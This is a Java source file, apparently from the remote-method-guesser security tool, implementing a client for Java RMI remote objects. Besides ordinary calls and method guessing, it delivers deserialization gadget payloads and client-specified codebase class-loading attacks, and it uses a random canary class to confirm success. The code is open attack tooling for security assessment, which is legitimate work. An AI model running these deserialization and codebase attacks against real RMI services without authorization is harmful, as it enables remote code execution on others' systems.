package de.qtc.rmg.operations;

import java.lang.reflect.Field;
import java.lang.reflect.Proxy;
import java.rmi.Remote;
import java.rmi.server.ObjID;
import java.rmi.server.RemoteObject;
import java.rmi.server.RemoteObjectInvocationHandler;
import java.rmi.server.RemoteRef;

import de.qtc.rmg.internal.ExceptionHandler;
import de.qtc.rmg.internal.MethodArguments;
import de.qtc.rmg.internal.MethodCandidate;
import de.qtc.rmg.io.Logger;
import de.qtc.rmg.networking.RMIWhisperer;
import de.qtc.rmg.utils.DefinitelyNonExistingClass;
import de.qtc.rmg.utils.RMGUtils;
import javassist.CannotCompileException;
import javassist.CtClass;
import javassist.NotFoundException;

/**
 * The RemoteObjectClient class is used for method guessing and communication to user defined remote objects.
 * It can be used to perform regular RMI calls to objects specified by either a bound name or an ObjID.
 * Apart from regular RMI calls, it also supports invoking methods with payload objects and user specified codebases.
 *
 * @author Tobias Neitzel (@qtc_de)
 */
public class RemoteObjectClient {

    private ObjID objID;
    private RMIWhisperer rmi;
    private RemoteRef remoteRef;

    private Field proxyField;
    private Field remoteField;

    private int legacyMode;
    private String boundName;
    private String remoteClass;
    private String randomClassName;


    /**
     * The RemoteObjectClient makes use of the official RMI API to obtain the RemoteObject from the RMI registry.
     * Afterwards, it needs access to the underlying UnicastRemoteRef to perform customized RMi calls. Depending
     * on the RMI version of the server (current Proxy approach or legacy stub objects), this requires access to
     * a different field within the Proxy or RemoteObject class. Both fields are made accessible within the constructor
     * to make the actual attacking code more clean.
     *
     * @param rmiRegistry registry to perform lookup operations
     * @param boundName for the lookup on the registry
     * @param remoteClass class name of the bound name (is created dynamically to prevent ClassNotFoundExceptions)
     * @param legacyMode the user specified legacyMode setting
     */
    public RemoteObjectClient(RMIWhisperer rmiRegistry, String boundName, String remoteClass, int legacyMode)
    {
        this.objID = null;
        this.rmi = rmiRegistry;
        this.boundName = boundName;
        this.legacyMode = legacyMode;
        this.remoteClass = remoteClass;

        try {
            this.proxyField = Proxy.class.getDeclaredField("h");
            this.remoteField = RemoteObject.class.getDeclaredField("ref");
            proxyField.setAccessible(true);
            remoteField.setAccessible(true);

        } catch(NoSuchFieldException | SecurityException e) {
            ExceptionHandler.unexpectedException(e, "MethodAttacker", "instantiation", true);
        }

        remoteRef = getRemoteRef();
    }

    /**
     * When the ObjID of a remote object is already known, we can talk to this object without a previous lookup
     * operation. In this case, the corresponding remote reference is constructed from scratch, as the ObjID and
     * the target address (host:port) are the only required informations.
     *
     * @param rmiRegistry target where the object is located
     * @param objID ID of the remote object to talk to
     * @param legacyMode user specified legacyMode setting
     */
    public RemoteObjectClient(RMIWhisperer rmiRegistry, int objID, int legacyMode)
    {
        this.rmi = rmiRegistry;
        this.legacyMode = legacyMode;
        this.objID = new ObjID(objID);

        remoteRef = getRemoteRef();
    }

    /**
     * Getter function for the bound name.
     *
     * @return bound name associated with the RemoteObjectClient
     */
    public String getBoundName()
    {
        return this.boundName;
    }

    /**
     * Invokes the specified MethodCandiate with a user specified payload object. This is used during deserialization
     * attacks and needs to target non primitive input arguments of RMI methods. By default, the function attempts
     * to find a non primitive method argument on it's own. However, by using the argumentPosition parameter, it is
     * also possible to specify it manually.
     *
     * @param targetMethod method to target for the attack
     * @param gadget payload object to use for the call
     * @param argumentPosition argument position to attack. Can be negative for auto selection.
     */
    public void gadgetCall(MethodCandidate targetMethod, Object gadget, int argumentPosition)
    {
        int attackArgument = findNonPrimitiveArgument(targetMethod, argumentPosition);

        Logger.printGadgetCallIntro("RMI");
        printIntro(targetMethod, attackArgument);

        MethodArguments argumentArray = prepareArgumentArray(targetMethod, gadget, attackArgument);

        try {
            rmi.genericCall(null, -1, targetMethod.getHash(), argumentArray, false, getMethodName(targetMethod), remoteRef);

            Logger.eprintln("Remote method invocation didn't cause any exception.");
            Logger.eprintln("This is unusual and the attack probably didn't work.");

        } catch (java.rmi.ServerException e) {

            Throwable cause = ExceptionHandler.getCause(e);

            if( cause instanceof java.rmi.UnmarshalException ) {
                Logger.eprintlnMixedYellow("Method", targetMethod.getSignature(), "does not exist on this bound name.");
                ExceptionHandler.showStackTrace(e);

            } else if( cause instanceof java.lang.ClassNotFoundException ) {

                if( e.getMessage().contains(randomClassName) ) {
                    ExceptionHandler.deserializeClassNotFoundRandom(e, "deserialization", "attack", randomClassName);

                } else {
                    ExceptionHandler.deserializeClassNotFound(e);
                }

            } else if( cause instanceof java.security.AccessControlException ) {
                ExceptionHandler.accessControl(e, "deserialization", "attack");

            } else {
                ExceptionHandler.unexpectedException(e, "deserialization", "attack", false);
            }

        } catch( java.lang.ClassCastException e ) {
            ExceptionHandler.deserlializeClassCast(e, true);

        } catch( java.security.AccessControlException e ) {
            ExceptionHandler.accessControl(e, "deserialization", "attack");

        } catch( java.rmi.UnmarshalException e ) {

            Throwable t = ExceptionHandler.getCause(e);
            if( t instanceof java.lang.ClassNotFoundException ) {
                Logger.eprintlnMixedYellow("Caught local", "ClassNotFoundException", "during deserialization attack.");
                Logger.eprintlnMixedBlue("This usually occurs when the", "gadget caused an exception", "on the server side.");
                Logger.eprintlnMixedYellow("You probably entered entered an", "invalid command", "for the gadget.");
                ExceptionHandler.showStackTrace(e);

            } else {
                ExceptionHandler.unexpectedException(e, "deserialization", "attack", false);
            }

        } catch( Exception e ) {
                ExceptionHandler.unknownDeserializationException(e);

        }
    }

    /**
     * This function invokes the specified MethodCandidate with a user specified codebase. The specified payload object
     * is expected to be an instance of the class that should be loaded from the codebase. Usually this is created
     * dynamically by rmg and the user has only to specify the class name. The function needs to target a non primitive
     * method argument, that is selected by default, but users can also specify an argumentPosition explicitly.
     *
     * @param targetMethod method to target for the attack
     * @param gadget instance of class that should be loaded from the client specified codebase
     * @param argumentPosition argument to use for the attack. Can be negative for auto selection
     */
    public void codebaseCall(MethodCandidate targetMethod, Object gadget, int argumentPosition)
    {
        int attackArgument = findNonPrimitiveArgument(targetMethod, argumentPosition);
        String methodName = getMethodName(targetMethod);

        Logger.printCodebaseAttackIntro("RMI", methodName, gadget.getClass().getName());
        printIntro(targetMethod, attackArgument);

        MethodArguments argumentArray = prepareArgumentArray(targetMethod, gadget, attackArgument);

        try {
            rmi.genericCall(null, -1, targetMethod.getHash(), argumentArray, true, methodName, remoteRef);

            Logger.eprintln("Remote method invocation didn't cause any exception.");
            Logger.eprintln("This is unusual and the attack probably didn't work.");

        } catch (java.rmi.ServerException e) {

            Throwable cause = ExceptionHandler.getCause(e);

            if( cause instanceof java.rmi.UnmarshalException ) {
                Logger.eprintlnMixedYellow("Method", targetMethod.getSignature(), "does not exist on this bound name.");
                ExceptionHandler.showStackTrace(e);

            } else if( cause instanceof java.lang.ClassNotFoundException ) {

                String exceptionMessage = e.getMessage();

                if( exceptionMessage.contains("RMI class loader disabled") ) {
                    ExceptionHandler.codebaseSecurityManager(e);
                }

                else if( exceptionMessage.contains(gadget.getClass().getName()) ) {
                    ExceptionHandler.codebaseClassNotFound(e, gadget.getClass().getName());
                }

                else if( exceptionMessage.contains(randomClassName) ) {
                    ExceptionHandler.codebaseClassNotFoundRandom(e, randomClassName, gadget.getClass().getName());

                } else {
                    ExceptionHandler.unexpectedException(e, "codebase", "attack", false);
                }

            } else if( cause instanceof java.lang.ClassFormatError || cause instanceof java.lang.UnsupportedClassVersionError) {
                ExceptionHandler.unsupportedClassVersion(e, "codebase", "attack");

            } else if( cause instanceof java.security.AccessControlException ) {
                ExceptionHandler.accessControl(e, "codebase", "attack");

            } else {
                ExceptionHandler.unexpectedException(e, "codebase", "attack", false);
            }

        } catch( java.lang.ClassCastException e ) {
            ExceptionHandler.codebaseClassCast(e, true);

        } catch( java.security.AccessControlException e ) {
            ExceptionHandler.accessControl(e, "codebase", "attack");

        } catch( Exception e ) {
            ExceptionHandler.unexpectedException(e, "codebase", "attack", false);
        }
    }

    /**
     * This function is used for regular RMI calls on the specified MethodCandidate. It takes an array of Objects as
     * input arguments and invokes the MethodCandidate with them accordingly. The function itself is basically just a
     * wrapper around the genericCall function from the RMIWhisperer class. Especially the transformation from the raw
     * Object array into the MethodArguments type is one of it's purposes.
     *
     * @param targetMethod remote method to call
     * @param argumentArray method arguments to use for the call
     */
    public void genericCall(MethodCandidate targetMethod, Object[] argumentArray)
    {
        CtClass rtype = null;
        MethodArguments callArguemnts = null;

        try {
            rtype = targetMethod.getMethod().getReturnType();
            callArguemnts = RMGUtils.applyParameterTypes(targetMethod.getMethod(), argumentArray);
        } catch(Exception e) {
            ExceptionHandler.unexpectedException(e, "preparation", "of remote method call", true);
        }

        try {
            rmi.genericCall(null, -1, targetMethod.getHash(), callArguemnts, false, getMethodName(targetMethod), remoteRef, rtype);

        } catch( java.rmi.ServerException e ) {

            Throwable cause = ExceptionHandler.getCause(e);
            if( cause instanceof java.rmi.UnmarshalException && e.getMessage().contains("unrecognized method hash"))
                ExceptionHandler.unrecognizedMethodHash("call", targetMethod.getSignature());

        } catch( Exception e ) {
            ExceptionHandler.unexpectedException(e, "generic call", "operation", false);
        }
    }

    /**
     * Just a wrapper around the genericCall function from the RMIWhisperer class. Invokes the specified MethodCandidate
     * with the specified set of MethodArguments.
     *
     * @param targetMethod method to invoke
     * @param argumentArray arguments to use for the call
     * @throws Exception this function is used e.g. for remote method guessing and raising all kind of exceptions is
     *         required.
     */
    public void rawCallNoReturn(MethodCandidate targetMethod, MethodArguments argumentArray) throws Exception
    {
        rmi.genericCall(null, -1, targetMethod.getHash(), argumentArray, false, getMethodName(targetMethod), remoteRef, null);
    }

    /**
     * Just a wrapper around the guessingCall function from the RMIWhisperer class.
     *
     * @param targetMethod method to invoke
     * @throws Exception this function is used e.g. for remote method guessing and raising all kind of exceptions is
     *         required.
     */
    public void guessingCall(MethodCandidate targetMethod) throws Exception
    {
        rmi.guessingCall(targetMethod, getMethodName(targetMethod), remoteRef);
    }

    /**
     * Helper function that is used during deserialization and codebase attacks. It prints information on the selected
     * argument position for the attack and also displays the parsed method signature again.
     *
     * @param targetMethod MethodCandidate that is attacked
     * @param attackArgument the argument position of the argument that is attacked
     */
    private void printIntro(MethodCandidate targetMethod, int attackArgument)
    {
        Logger.printMixedBlue("Using non primitive argument type", targetMethod.getArgumentTypeName(attackArgument));
        Logger.printlnPlainMixedBlue(" on position", String.valueOf(attackArgument));
        Logger.printlnMixedYellow("Specified method signature is", targetMethod.getSignature());

        Logger.println("");
    }

    /**
     * Obtains a remote reference to the desired remote object. If this.objID is not null, the remote reference is always
     * constructed manually by using the ObjID value. Otherwise, an RMI lookup is used to obtain it by bound name.
     *
     * @return Remote reference to the targeted object
     */
    private RemoteRef getRemoteRef()
    {
        if(this.objID == null)
            return getRemoteRefByName();
        else
            return this.rmi.getRemoteRef(this.objID);
    }

    /**
     * This function obtains a remote reference by using the regular way. It looks up the bound name that was specified
     * during construction of the RemoteObjectClient to obtain the corresponding object from the registry. Reflection
     * is then used to make the remote reference accessible.
     *
     * @return Remote reference to the targeted object
     */
    private RemoteRef getRemoteRefByName()
    {
        boolean isLegacy = RMGUtils.isLegacy(this.remoteClass, this.legacyMode, true);

        Remote instance = null;
        RemoteRef remoteReference = null;

        try {
            if( !isLegacy ) {
                RMGUtils.makeInterface(this.remoteClass);
                instance = rmi.getRegistry().lookup(boundName);

                RemoteObjectInvocationHandler ref = (RemoteObjectInvocationHandler)proxyField.get(instance);
                remoteReference = ref.getRef();

            } else {
                RMGUtils.makeLegacyStub(this.remoteClass);
                instance = rmi.getRegistry().lookup(boundName);

                remoteReference = (RemoteRef)remoteField.get(instance);
            }

        } catch(java.rmi.NotBoundException e) {
            Logger.eprintlnMixedYellow("Specified bound name", boundName, "is not bound to the registry.");
            RMGUtils.exit();

        } catch(Exception e) {
            ExceptionHandler.unexpectedException(e, "remote reference lookup", "operation", true);
        }

        return remoteReference;
    }

    /**
     * Helper function to find the first non primitive argument within a method or to check whether the
     * user specified argument position is really a non primitive. Basically relies on getPrimitive from
     * the MethodCandidate class. The function itself is mainly concerned on the error handling.
     *
     * @param targetMethod MethodCandidate to look for non primitives
     * @param position user specified argument position
     * @return position of the first non primitive argument or the user specified position if primitive
     */
    private int findNonPrimitiveArgument(MethodCandidate targetMethod, int position)
    {
        int attackArgument = 0;

        try {
            attackArgument = targetMethod.getPrimitive(position);

        } catch (CannotCompileException | NotFoundException e) {
            ExceptionHandler.unexpectedException(e, "search", "for primitive types", true);
        }

        if( attackArgument == -1 ) {

            if( position == -1 )
                Logger.eprintlnMixedYellow("No non primitive arguments were found for method signature", targetMethod.getSignature());

            RMGUtils.exit();
        }

        return attackArgument;
    }

    /**
     * During deserialization and codebase attacks, rmg uses a canary to check whether the attack was successful.
     * Instead of sending the plain payload object to the RMI endpoint, rmg always sends an Object array that consists
     * out of the actual payload Object and a canary class. The canary class is randomly generated during runtime and
     * passed in the second position within the Object array. The payload itself is used in the first position.
     *
     * Only if the payload object was successfully processed on the RMI server, it will attempt to load the canary class,
     * that leads to a ClassNotFoundException. This makes it reliably detectable whether an attack was successful.
     *
     * @param targetMethod MethodCandidate to create the payload for.
     * @param gadget payload object to use in the payload
     * @param attackArgument position of a non primitive argument
     * @return MethodArguments to use for the call
     */
    @SuppressWarnings("deprecation")
    private MethodArguments prepareArgumentArray(MethodCandidate targetMethod, Object gadget, int attackArgument)
    {
        Object[] methodArguments = null;

        try {
            methodArguments = RMGUtils.getArgumentArray(targetMethod.getMethod());
        } catch (Exception e) {
            ExceptionHandler.unexpectedException(e, "argument array", "construction", true);
        }

        Object[] payloadArray = new Object[2];
        Object randomInstance = null;

        try {
            Class<?> randomClass = RMGUtils.makeRandomClass();
            randomInstance = randomClass.newInstance();

        } catch (Exception e) {
            randomInstance = new DefinitelyNonExistingClass();
        }

        this.randomClassName = randomInstance.getClass().getName();

        payloadArray[0] = gadget;
        payloadArray[1] = randomInstance;
        methodArguments[attackArgument] = payloadArray;

        MethodArguments callArguments = null;
        try {
            callArguments = RMGUtils.applyParameterTypes(targetMethod.getMethod(), methodArguments);
        } catch(Exception e) {
            ExceptionHandler.unexpectedException(e, "parameter types", "mapping", true);
        }

        return callArguments;
    }

    /**
     * Due to other internal requirements, the getName function from the MethodCandidate class does not
     * implement exception handling. Therefore, this function provides a simple wrapper class that catches
     * exceptions.
     *
     * @param targetMethod MethodCandidate to obtain the name from
     * @return method name of the MethodCandidate
     */
    private String getMethodName(MethodCandidate targetMethod)
    {
        String methodName = "";

        try {
            methodName = targetMethod.getName();
        } catch (CannotCompileException | NotFoundException e) {
            ExceptionHandler.unexpectedException(e, "compliation", "process", true);
        }

        return methodName;
    }
}
